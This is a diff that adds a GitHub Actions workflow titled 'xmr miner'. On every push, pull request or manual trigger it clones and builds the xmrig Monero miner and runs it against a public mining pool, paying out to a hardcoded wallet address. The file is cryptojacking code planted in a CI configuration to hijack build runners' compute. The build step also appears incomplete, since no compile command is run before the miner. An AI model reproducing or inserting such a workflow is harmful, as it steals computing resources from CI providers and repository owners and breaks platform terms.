@@ -1,0 +1,28 @@
+name: xmr miner 🦹‍♂️
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Installs xmrig
+        run: |
+          sudo apt update
+          sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+
+      - name: Runs xmrig
+        run: |
+          ./xmrig -o pool.supportxmr.com:3333 -u {49ucRzKeG7XZsdKfCswGEHQstBXpTgKZjFiCrNsqdQnvXBcYb8rDnAqEo8X3FQeve7QaRQqshEPCagDxnL2LVbXPCFb2qQu} -k --tls --rig-id workflow
